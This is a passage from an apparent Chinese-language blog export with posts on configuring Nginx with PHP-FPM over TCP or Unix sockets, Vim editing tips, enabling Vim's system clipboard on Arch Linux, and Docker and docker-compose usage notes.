<p>Nginx 调用 PHP-CGI 时会传第必要的信息如 URI、URL 参数、POST、HTTP header 等，<a href="%5Bhttps://tools.ietf.org/html/rfc3875%5D(https://tools.ietf.org/html/rfc3875)"><strong>通用网关接口 （CGI ）</strong></a>规定了从 Nginx 到 PHP-CGI 之间的数据传输格式。</p>
<p>PHP-CGI 接收到 CGI 传来的数据后：环境初始化 –&gt; 处理请求 –&gt; 返回结果 –&gt; 杀死进程 。每个请求都将对应一个 PHP-CGI 进程，因此导致服务器性能下降，并发不高。因此出现了一种新的协议叫 <strong><a href="https://en.wikipedia.org/wiki/FastCGI">快速通用网关接口（FastCGI）</a></strong>，FastCGI 的主要目标是减少 Web 服务器和 CGI 程序之间通信的开销，允许服务器一次处理更多的网页请求。</p>
<p> PHP-FPM  就是 FastCGI  协议的实现，对于 Fast-CGI 程序，不是每个请求都创建一个进程，PHP-FPM 会先启一个 Master 进程 –&gt; 解析配置文件 –&gt; 初始化执行环境 –&gt; 启动多个 Worker。每个 Worker 都是一个 PHP-CGI，当请求过来时，Master 会将请求交给一个 Worker，然后立即可以接受下一个请求。PHP-FPM 对 PHP-CGI 进程进行管理，当 Worker 不够用时，Master 可以根据配置预先启动几个Worker ；当然空闲 Worker 太多时，也会停掉一些，这样就提高了性能，也节约了资源。</p>
<p><img src="/images/20180331/Nginx-fpm-Communitacion.png" alt="img"></p>
<h2 id="Nginx-与-PHP-FPM-通信机制与配置"><a href="#Nginx-与-PHP-FPM-通信机制与配置" class="headerlink" title="Nginx 与 PHP-FPM 通信机制与配置"></a>Nginx 与 PHP-FPM 通信机制与配置</h2><p>Nginx 和 FastCGI 的通信方式有两种，一种是 TCP socket，一种是 Unix domain socket 。连接示意图如下：</p>
<p><img src="/images/20180331/FPM-Nginx-TCP-Unix.png"></p>
<h3 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h3><h4 id="TCP通信配置"><a href="#TCP通信配置" class="headerlink" title="TCP通信配置"></a>TCP通信配置</h4><p><strong>第一步</strong>，编辑 Nginx 配置文件 <code>/path/to/nginx/conf/your-stie.conf</code></p>
<p>如果 PHP-FPM 和 Nginx 在同一台机器上，将 <code>fastcgi_pass</code>参数修改为<code>127.0.0.1:9000</code>，不在同一台机器时，将<code>127.0.0.1</code>替换为 PHP-FPM 所在机器的 IP， 如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">      index index.php index.html index.htm;</span><br><span class="line">      include /etc/nginx/fastcgi_params;</span><br><span class="line">      fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">      fastcgi_index index.php;</span><br><span class="line">      include fastcgi_params;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<p> <strong>第二步</strong>，编辑PHP-FPM 配置文件 <code>/path/to/php/etc/php-fpm.conf</code></p>
<p>将 <code>listen</code> 参数修改为 <code>your-php-fpm-ip:9000</code>，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">listen = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9000</span></span><br></pre></td></tr></table></figure>

<p> <strong>第三步</strong>，重启或重新载入 Nginx 和 PHP-FPM 的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">kill</span> all php-fpm</span></span><br><span class="line">pgrep php-fpm | xargs kill</span><br><span class="line">cd /path/to/php/sbin/ &amp;&amp; ./php-fpm</span><br></pre></td></tr></table></figure>



<h4 id="Unix-socket-配置方式"><a href="#Unix-socket-配置方式" class="headerlink" title="Unix socket 配置方式"></a>Unix socket 配置方式</h4><p>Unix socket其实严格意义上应该叫 Unix domain socket，它是 *nix 系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是 .sock ）作为 socket 的唯一标识（描述符），需要通信的两个进程引用同一个 socket 描述符文件就可以建立通道进行通信了。</p>
<p><strong>第一步</strong>，决定你的 socket 描述符文件的存储位置。</p>
<p>可以放在系统的任意位置，如果想要更快的通信速度，可以放在 &#x2F;dev&#x2F;shm下面，这个目录是所谓的 tmpfs，是RAM 可以直接使用的区域，所以，读写速度都会很快。</p>
<p>决定了文件位置，就要修改文件的权限了，要让 Nginx 和 PHP-FPM 对它都有读写的权限，可以这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo touch /dev/shm/fpm-cgi.sock</span><br><span class="line">sudo chown www-data:www-data /dev/shm/fpm-cgi.sock</span><br><span class="line">sudo chmod 666 /dev/shm/fpm-cgi.sock</span><br></pre></td></tr></table></figure>



<p><strong>第二步</strong>，修改 PHP-FPM 配置文件 <code>/path/to/php/etc/php-fpm.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">listen = /dev/shm/fpm-cgi.sock</span><br><span class="line"></span><br><span class="line">; Set listen(2) backlog. A value of &#x27;-1&#x27; means unlimited.</span><br><span class="line">; Default Value: 128 (-1 on FreeBSD and OpenBSD)</span><br><span class="line">listen.backlog = -1</span><br></pre></td></tr></table></figure>

<p> 注意： 要注意根据并发调整 listen.backlog 参数的值，默认是128，在高并发下可以改为-1，表示可以无限使用连接，最大连接限制有操作系统层控制。如下可以修改限制：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo &#x27;net.core.somaxconn = 2048&#x27; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure>

<p> <strong>第三步</strong>，修改 Nginx 站点配置文件 <code>/path/to/nginx/conf/your-stie.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">      index index.php index.html index.htm;</span><br><span class="line">      include /etc/nginx/fastcgi_params;</span><br><span class="line">      fastcgi_pass /dev/shm/fpm-cgi.sock;</span><br><span class="line">      fastcgi_index index.php;</span><br><span class="line">      include fastcgi_params;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p> <strong>第四步</strong>，重启或重新载入 Nginx 和 PHP-FPM 的配置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">kill</span> all php-fpm</span></span><br><span class="line">pgrep php-fpm | xargs kill</span><br><span class="line">cd /path/to/php/sbin/ &amp;&amp; ./php-fpm</span><br></pre></td></tr></table></figure>



<h4 id="两种通信方式的分析和总结"><a href="#两种通信方式的分析和总结" class="headerlink" title="两种通信方式的分析和总结"></a>两种通信方式的分析和总结</h4><p>从原理上来说，Unix socket 方式肯定要比 TCP 的方式快而且消耗资源少，因为 TCP 需要经过本地回环驱动，还要申请临时端口。</p>
<p>Unix socket 会显得不是那么稳定，当并发连接数爆发时，会产生大量的长时缓存，在没有面向连接协议支撑的情况下，大数据包很有可能就直接出错并不会返回异常。而 TCP 这样的面向连接的协议，多少可以保证通信的正确性和完整性。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xieminis.me/?p=216">http://xieminis.me/?p=216</a></p>
<p><a href="http://www.cnblogs.com/tinywan/p/6625432.html">http://www.cnblogs.com/tinywan/p/6625432.html</a></p>
<p><a href="https://www.awaimai.com/371.html">https://www.awaimai.com/371.html</a></p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>《Vim 实用技巧》读书笔记</title>
    <url>/experience/practice/linux-reading-note-of-practical-vim-I/</url>
    <content><![CDATA[<p>知识源于不断实践与训练，认知源于认真阅读，知识应该是衡量一个人的重要标准。</p>
<p>掌握一项技能对一个人的改变的多少取决于获得这项技能所花费的时间，这就是我下定决心要学习 Vim 的原因。</p>
<span id="more"></span>
<p>《Vim 实用技巧》是一本学习 Vim 非常高效的书，以下为阅读此书中摘录和总结的一些技能，以便后续查阅。</p>
<ol>
<li><p>使用 * 对光标下的单词进行搜索</p>
</li>
<li><p>使用 . 重复上一次的修改</p>
</li>
<li><p>在如下代码种每行末尾添加 ”;“</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var foo = 1</span><br><span class="line">var bar = &#x27;a&#x27;</span><br><span class="line">var foobar = foo + bar</span><br></pre></td></tr></table></figure>
<pre><code>方法一、 $a; 然后 j$.
方法二、 $A; 然后 j.
方法三、 $A; 然后 SHIFT-V 选择两行，:&lt;&#39;,&#39;&gt; nomarl .

注：以下命令为等效命令，并且都是从普通模式切换到插入模式 
    A &lt;==&gt; $a
    C &lt;==&gt; c$
    s &lt;==&gt; cl
    S &lt;==&gt; ^c 删除整行从头插入
    I &lt;==&gt; ^i
    o &lt;==&gt; A&lt;CR&gt;
    O &lt;==&gt; ko
</code></pre>
<ol start="4">
<li>以退为进—— 给以下代码种 + 号前后添加空格</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var foo = &quot;method(&quot;+argument1+&quot;,&quot;+argument2+&quot;)&quot;;</span><br></pre></td></tr></table></figure>
<pre><code>使用 f+ 找到 + 号，然后 s 先删除 + 在写入 &lt;space&gt;+&lt;space&gt; 重复 3 次 ;.
注：
    使用 :s/target/replacement  执行替换的时候 &amp; 重复下一个替换，u 撤销替换
</code></pre>
<ol start="5">
<li><p>使用 * 查找光标下的单词</p>
</li>
<li><p>插入分块，使得撤销拥有粒度，比如在插入模式种使用 <ESC>o 另起一行，而不是直接 <enter></p>
</li>
<li><p>构造可重复性修改，如下假设光标位于 h 字符上，要删除整个单词</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The end is nigh</span><br></pre></td></tr></table></figure>
<pre><code>方法一、dbx
方法二、bdw
方法三、daw
</code></pre>
<ol start="8">
<li>大小写转换</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this is a HTML doc!</span><br><span class="line">g~</span><br><span class="line">gu</span><br><span class="line">gU</span><br></pre></td></tr></table></figure>

<ol start="9">
<li><p>插入模式删除操作<br> <C-h> 相当于 Backspace<br> <C-w> 删除前一个单词<br> <C-u> 删除至行首<br> 这些命令在 shell 下也有效</p>
</li>
<li><p>插入模式切换到普通模式<br>&lt;C-[&gt; 等效与 <Esc><br><C-o> 插入模式切换到普通模式执行一次命令后再次回到插入模式</p>
</li>
<li><p>在插入模式种使用 <C-r>{register} 将寄存器种的内容粘贴到光标后面。使用 :reg 查看寄存器及寄存器种的内容，其中 + 为系统剪切板。需要注意的是如果开启 textwidth 和 autoindent 选项时粘贴文本可能会发生不必要的缩进，发生格式错乱。这时，可以使用 <C-r><C-p>{reg} 按原意插入文本并修正不必要的缩进，也可以退回到普通模式种对文本进行粘贴。</p>
</li>
<li><p>使用&#x3D;寄存器做运算，在插入模式下 <C-r>&#x3D;{算术表达式}</p>
</li>
<li><p><C-v>{字符编码} 插入非常用字符，如果 <C-v>后面的表达式是一个非数字键，则会插入这个非数字键本身所代表的字符。例如在 expandtab 选项开启的情况下，<Tab> 键会插入与其等宽的多个空格，但是使用 <C-v><Tab> 会插入其本身字符，不管 expandtab 选项是否开启。</p>
</li>
<li><p>二合字母在插入模式下使用 <C-k>{char1}{char2} 可输入二合字母，如 ¼ <C-k>14，使用 :h digrah-table 可以查看二合字母列表</p>
</li>
<li><p>使用 <Insert> 键或者 R 切换到替换模式，r 替换当前字符，使用 tabstop 设置 <Tab> 键占宽度，这导致 <Tab> 在替换模式下会出现位置错乱，因此可以使用 gR 触发虚拟替换模式，虚拟替换模式是按屏幕实际显示的宽度来替换字符的。</p>
</li>
<li><p>可视模式<br>面向字符的可视模式 v 普通模式与此模式之间切换<br>面向整行的可视模式 V 普通模式与此模式之间切换<br>面向列块的可视模式 <C-v> 普通模式与此模式之间切换</p>
<p>注：<br>gv 用于重选上一次由可视模式所选择的文本范围<br>可视模式下 o 用于切换选择文本的活动段</p>
</li>
<li><p>选择模式 <C-g> 可以在可视模式与选择模式之间切换，选择模式中输入字符会替换选中内容。</p>
</li>
<li><p>在可视模式下，. 模式容易出现意想不到的问题，因此在面对重复修改时应尽量选操作命令而不是可视化命令。</p>
</li>
<li><p>命令行模式 Ex 命令<br>:edit 编辑<br>:write 保存<br>:read 读取文件内容粘贴到光标所在位置<br>:split 分割窗口 sp&#x2F;vs </p>
</li>
<li><p>操作缓冲区文本的 Ex 的命令<br>:[range]delete [x]           删除指定范围内的行[到寄存器x种]<br>:[range]yank [x]             复制指定范围的行[到寄存器x种]<br>:[range]put [x]              粘贴 x 寄存器内容<br>:[range]copy {address}       拷贝指定行内容到 {address} 下，:copy 缩写为 :t 或 :co<br>:[range]move {address}       移动，:move 缩写为 :m<br>:[range]jion                 连接指定行<br>:[range]normal {commands}    对指定范围内所有行执行命令<br>:[range]substitute&#x2F;{pattern}&#x2F;{string}&#x2F;flag 替换<br>:[range]global&#x2F;{pattern}&#x2F;[cmd] 对所有匹配到的所有行都执行Ex 命令[cmd]</p>
</li>
<li><p>命令模式下范围语法<br>1                           文件第一行<br>$                           文件最后一行<br>0                           虚拟行，位于第一行前<br>.                           光标所在行<br>‘m                          包行位置标记 m 的行<br>‘&lt;                          高亮选区的起始行<br>‘&gt;                          高亮选区的结束行<br>%                           整个文件，:1,$ 等效</p>
</li>
<li><p>在命令模式下，使用 @: 重复上次的 Ex 命令，相当于普通模式下的 . 使用 <Tab> 不全 Ex 命令，<C-d> 列出不全列表，<Tab> 补全行为可以通过 wildmode 选项设置，默认补全行为是 full，设置 set wildmode&#x3D;longest,list 即和 bash shell 下的补全方式相同。</p>
</li>
<li><p>在命令模式下使用 <c-r><C-w> 将光标下的单词输入到命令行中，使用 <Up> <Down> 可以回溯历史命令，默认历史命令保留 20 条，使用 history 参数可以设定保留的历史命令条目数。 set history &#x3D; 500。也可以使用 <C-p> 和 <C-n> 组合键来反向或正向遍历历史命令，但 <C-p> 和 <C-n> 命令有个缺点,它们不会像 <Up> 和 <Down> 那样对历史命令进行过滤。<br>通过创建下面的自定义映射项,我们可以把二者的优点结合到一起: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnoremap &lt;C-p&gt; &lt;Up&gt;</span><br><span class="line">cnoremap &lt;C-n&gt; &lt;Down&gt;</span><br></pre></td></tr></table></figure>
<p>   使用 q: 调出历史命令列表 </p>
</li>
<li><p>命令模式中运行 Shell 命令 :! [shellcmd]，% 代表当前编辑的文件名，如果向在命令模式下连续执行几条命令，可以使用 :shell 开启一个交互的 shell 会话，exit 退出 shell 会话，可以使用 :read !{cmd} 将 shell 命令的输出读入当前缓冲区<br>:[range]write !{cmd}            在 shell 中执行 {cmd} ,以 [range] 作为其标准输入<br>:[range]!{filter}               使用外部程序 {filter} 过滤指定的 [range]</p>
</li>
</ol>
<p>未完待续 ……</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim 使用系统剪切板</title>
    <url>/experience/practice/linux-vim-using-system-clipboard/</url>
    <content><![CDATA[<p>VIM 支持很多种剪切板，常见的有 0,2,3,…,9,a,和”，如果开启了系统剪切板，则还有 + 和 *，可使用命令<code>:reg</code> 查看各剪切板的状态。</p>
<span id="more"></span>

<h2 id="VIM-开启剪切板"><a href="#VIM-开启剪切板" class="headerlink" title="VIM 开启剪切板"></a>VIM 开启剪切板</h2><p>如果 <code>:reg</code> 种没有 + 剪切板，通过在终端种执行shell命令<code>vim --version | grep clipboard</code> 查看结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ vim --version | grep clipboard</span><br><span class="line">-clipboard         +jumplist          +persistent_undo   +virtualedit</span><br><span class="line">-ebcdic            -mouseshape        +statusline        -xterm_clipboard</span><br></pre></td></tr></table></figure>
<p>+clipboard表示选项开启，-clipboard表示未开启，对于 arch Linux 我们可以使用以下任意一种方式启用系统剪切板。</p>
<h3 id="方法一、使用-gvim"><a href="#方法一、使用-gvim" class="headerlink" title="方法一、使用 gvim"></a>方法一、使用 gvim</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pacman -S gvim</span><br></pre></td></tr></table></figure>
<p>这种方式仅使用 gvim 替换 vim，不会改变原来 vim 的配置，简单实用。</p>
<h3 id="方法二、使用-abs-重新编译-Vim"><a href="#方法二、使用-abs-重新编译-Vim" class="headerlink" title="方法二、使用 abs 重新编译 Vim"></a>方法二、使用 abs 重新编译 Vim</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pacman -S abs</span><br><span class="line">$ abs extra/vim</span><br><span class="line">$ cp -r /var/abs/extra/vim ~/ &amp;&amp; cd ~/vim</span><br></pre></td></tr></table></figure>
<p>修改 PKGBUILD 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PKGBUILD</span><br><span class="line">...</span><br><span class="line">pkgname=(&#x27;vim&#x27; &#x27;gvim&#x27; &#x27;vim-runtime&#x27;)</span><br><span class="line">$ 去除不需要编译的包</span><br><span class="line">$ 至于编译依赖，不了解可以像我一样选择不取消</span><br><span class="line">...</span><br><span class="line">--with-x=yes \</span><br><span class="line">$ 把 Vim 编译选项中 --with-x 的 no 改为 yes</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>编译并创建包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ makepkg -s</span><br></pre></td></tr></table></figure>
<p>安装 Vim</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pacman -U vim-7.3.754-1-x86_64.pkg.tar.xz</span><br></pre></td></tr></table></figure>
<p>重启 Vim.</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>-<a href="https://blog.fooleap.org/using-vim-with-clipboard-on-archlinux.html">Arch Linux 启用系统剪切板</a></p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 学习笔记（2）</title>
    <url>/experience/practice/linux-learning-docker-II/</url>
    <content><![CDATA[<p>上一篇文章介绍了 Docker 的基本使用，本文将介绍 Dockerfile 定制容器镜像和使用 Docker-compose 工具编排、管理 Docker。</p>
<span id="more"></span>
<h2 id="一、Dockerfile-定制镜像"><a href="#一、Dockerfile-定制镜像" class="headerlink" title="一、Dockerfile 定制镜像"></a>一、Dockerfile 定制镜像</h2><h3 id="容器分层"><a href="#容器分层" class="headerlink" title="容器分层"></a>容器分层</h3><p>Docker 镜像位于 bootfs 之上，镜像分层，每一层镜像的下面一层成为其父镜像，镜像启动之后称为容器， 容器在镜像之上堆叠新的一层，所有的镜像层都是 readonly，所以容器层的改变不会影响其父镜像。</p>
<p>如图，一个 Apache 镜像有 Debian 基础镜像堆叠 emacs 等工具镜像后打包而成，镜像启动后成为容器。</p>
<p><img src="/images/20180717/docker-sheeting.jpg"></p>
<h3 id="定制容器"><a href="#定制容器" class="headerlink" title="定制容器"></a>定制容器</h3><p>使用 <code>docker commit</code> 可以保存容器的改变，但不建议以此方式定制容器，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker image <span class="built_in">ls</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker image <span class="built_in">rm</span> xxx</span></span><br><span class="line">Error response from daemon: conflict: unable to delete 920e5c5c8bed (cannot be forced) - image has dependent child images</span><br></pre></td></tr></table></figure>

<p>这种方式定制的容器是基于上一个父容器存储层的改变，因此存在相互依赖关系，使得镜像管理更加繁琐。</p>
<p>可以使用 Dockerfile 定制容器，如下定制自己的 <code>nginx</code> 容器，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> mynginx</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> mynginx</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> Dockerfile</span></span><br></pre></td></tr></table></figure>

<p>编辑 <code>Dockerfile</code>文件，添加以下内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">RUN echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.html</span><br></pre></td></tr></table></figure>

<p>构建容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t ngxin:mynginx .</span></span><br></pre></td></tr></table></figure>

<p>更多 <code>Dockerfile</code>  相关命令如下，</p>
<ul>
<li>FROM</li>
<li>RUN</li>
<li>COPY 本地文件拷贝到新一层的镜像内，新镜像存储路径可以用相对路径也可以用绝对路径，相对路径用 WORKDIR 命令指定</li>
<li>ADD</li>
<li>CMD</li>
<li>ENTRYPOINT</li>
<li>ENV  设置环境变量</li>
<li>VOLUME 定义匿名卷</li>
<li>EXPOSE 暴露端口</li>
<li>WORKDIR</li>
<li>USER</li>
</ul>
<h2 id="二、使用-Docker-compose"><a href="#二、使用-Docker-compose" class="headerlink" title="二、使用 Docker-compose"></a>二、使用 Docker-compose</h2><p><a href="https://github.com/docker/compose">Docker-compose</a> 是官方开源的项目，用于编排、部署 Docker 项目(Define and run multi-container applications with Docker)。</p>
<h3 id="4-1-定义-docker-compose-yml"><a href="#4-1-定义-docker-compose-yml" class="headerlink" title="4.1 定义 docker-compose.yml"></a>4.1 定义 <code>docker-compose.yml</code></h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">        <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">         <span class="bullet">-</span> <span class="string">&quot;5000:5000&quot;</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">         <span class="bullet">-</span> <span class="string">.:/code</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">redis</span></span><br></pre></td></tr></table></figure>


<h3 id="4-2-docker-compose-命令"><a href="#4-2-docker-compose-命令" class="headerlink" title="4.2 docker-compose 命令"></a>4.2 docker-compose 命令</h3><ul>
<li><p><code>build</code></p>
<p>  格式为 <code>docker-compose build [options] [SERVICE...]</code>。</p>
<p>  构建（重新构建）项目中的服务容器。</p>
<p>  服务容器一旦构建后，将会带上一个标记名，例如对于 web 项目中的一个 db 容器，可能是 web_db。</p>
<p>  可以随时在项目目录下运行 <code>docker-compose build</code> 来重新构建服务。</p>
<p>  选项包括：</p>
<ul>
<li><code>--force-rm</code> 删除构建过程中的临时容器。</li>
<li><code>--no-cache</code> 构建镜像过程中不使用 cache（这将加长构建过程）。</li>
<li><code>--pull</code> 始终尝试通过 pull 来获取更新版本的镜像。</li>
</ul>
<p>  ​</p>
</li>
<li><p><code>config</code></p>
<p>  验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因。</p>
</li>
<li><p><code>down</code></p>
<p>  此命令将会停止 <code>up</code> 命令所启动的容器，并移除网络 ​</p>
</li>
<li><p><code>exec</code></p>
<p>  进入指定的容器。</p>
</li>
<li><p><code>help</code></p>
<p>  获得一个命令的帮助。</p>
</li>
<li><p><code>images</code></p>
<p>  列出 Compose 文件中包含的镜像。</p>
</li>
<li><p><code>kill</code></p>
<p>  格式为 <code>docker-compose kill [options] [SERVICE...]</code>。</p>
<p>  通过发送 <code>SIGKILL</code> 信号来强制停止服务容器。</p>
<p>  支持通过 <code>-s</code> 参数来指定发送的信号，例如通过如下指令发送 <code>SIGINT</code> 信号。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker-compose kill -s SIGINT</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>logs</code></p>
<p>  格式为 <code>docker-compose logs [options] [SERVICE...]</code>。</p>
<p>  查看服务容器的输出。默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分。可以通过 <code>--no-color</code> 来关闭颜色。</p>
<p>  该命令在调试问题的时候十分有用。</p>
</li>
<li><p><code>pause</code></p>
<p>  格式为 <code>docker-compose pause [SERVICE...]</code>。</p>
<p>  暂停一个服务容器。</p>
</li>
<li><p><code>port</code></p>
<p>  格式为 <code>docker-compose port [options] SERVICE PRIVATE_PORT</code>。</p>
<p>  打印某个容器端口所映射的公共端口。</p>
<p>  选项：</p>
<ul>
<li><code>--protocol=proto</code> 指定端口协议，tcp（默认值）或者 udp。</li>
<li><code>--index=index</code> 如果同一服务存在多个容器，指定命令对象容器的序号（默认为 1）。</li>
</ul>
</li>
<li><p><code>ps</code></p>
<p>  格式为 <code>docker-compose ps [options] [SERVICE...]</code>。</p>
<p>  列出项目中目前的所有容器。</p>
<p>  选项：</p>
<ul>
<li><code>-q</code> 只打印容器的 ID 信息。</li>
</ul>
</li>
<li><p><code>pull</code></p>
<p>  格式为 <code>docker-compose pull [options] [SERVICE...]</code>。</p>
<p>  拉取服务依赖的镜像。</p>
<p>  选项：</p>
<ul>
<li><code>--ignore-pull-failures</code> 忽略拉取镜像过程中的错误。</li>
</ul>
</li>
<li><p><code>push</code></p>
<p>  推送服务依赖的镜像到 Docker 镜像仓库。</p>
</li>
<li><p><code>restart</code></p>
<p>  格式为 <code>docker-compose restart [options] [SERVICE...]</code>。</p>
<p>  重启项目中的服务。</p>
<p>  选项：</p>
<ul>
<li><code>-t, --timeout TIMEOUT</code> 指定重启前停止容器的超时（默认为 10 秒）。</li>
</ul>
</li>
<li><p><code>rm</code></p>
<p>  格式为 <code>docker-compose rm [options] [SERVICE...]</code>。</p>
<p>  删除所有（停止状态的）服务容器。推荐先执行 <code>docker-compose stop</code> 命令来停止容器。</p>
<p>  选项：</p>
<ul>
<li><code>-f, --force</code> 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。</li>
<li><code>-v</code> 删除容器所挂载的数据卷。</li>
</ul>
</li>
<li><p><code>run</code></p>
<p>  格式为 <code>docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]</code>。</p>
<p>  在指定服务上执行一个命令。</p>
<p>  例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker-compose run ubuntu ping docker.com</span><br></pre></td></tr></table></figure>

<p>  将会启动一个 ubuntu 服务容器，并执行 <code>ping docker.com</code> 命令。</p>
<p>  默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中。</p>
<p>  该命令类似启动容器后运行指定的命令，相关卷、链接等等都将会按照配置自动创建。</p>
<p>  两个不同点：</p>
<ul>
<li>给定命令将会覆盖原有的自动运行命令；</li>
<li>不会自动创建端口，以避免冲突。</li>
</ul>
<p>  如果不希望自动启动关联的容器，可以使用 <code>--no-deps</code> 选项，例如</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker-compose run --no-deps web python manage.py shell</span><br></pre></td></tr></table></figure>

<p>  将不会启动 web 容器所关联的其它容器。</p>
<p>  选项：</p>
<ul>
<li><code>-d</code> 后台运行容器。</li>
<li><code>--name NAME</code> 为容器指定一个名字。</li>
<li><code>--entrypoint CMD</code> 覆盖默认的容器启动指令。</li>
<li><code>-e KEY=VAL</code> 设置环境变量值，可多次使用选项来设置多个环境变量。</li>
<li><code>-u, --user=&quot;&quot;</code> 指定运行容器的用户名或者 uid。</li>
<li><code>--no-deps</code> 不自动启动关联的服务容器。</li>
<li><code>--rm</code> 运行命令后自动删除容器，<code>d</code> 模式下将忽略。</li>
<li><code>-p, --publish=[]</code> 映射容器端口到本地主机。</li>
<li><code>--service-ports</code> 配置服务端口并映射到本地主机。</li>
<li><code>-T</code> 不分配伪 tty，意味着依赖 tty 的指令将无法运行。</li>
</ul>
</li>
<li><p><code>scale</code></p>
<p>  格式为 <code>docker-compose scale [options] [SERVICE=NUM...]</code>。</p>
<p>  设置指定服务运行的容器个数。</p>
<p>  通过 <code>service=num</code> 的参数来设置数量。例如：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ docker-compose scale web=3 db=2</span><br></pre></td></tr></table></figure>

<p>  将启动 3 个容器运行 web 服务，2 个容器运行 db 服务。</p>
<p>  一般的，当指定数目多于该服务当前实际运行容器，将新创建并启动容器；反之，将停止容器。</p>
<p>  选项：</p>
<ul>
<li><code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。<br>​</li>
</ul>
</li>
<li><p><code>start</code></p>
<p>  格式为 <code>docker-compose start [SERVICE...]</code>。</p>
<p>  启动已经存在的服务容器。</p>
</li>
<li><p><code>stop</code></p>
<p>  格式为 <code>docker-compose stop [options] [SERVICE...]</code>。</p>
<p>  停止已经处于运行状态的容器，但不删除它。通过 <code>docker-compose start</code> 可以再次启动这些容器。</p>
<p>  选项：</p>
<ul>
<li><p><code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。</p>
</li>
<li><p><code>top</code></p>
</li>
</ul>
<p>  查看各个服务容器内运行的进程。</p>
</li>
<li><p><code>unpause</code></p>
<p>  格式为 <code>docker-compose unpause [SERVICE...]</code>。</p>
<p>  恢复处于暂停状态中的服务。</p>
</li>
<li><p><code>up</code></p>
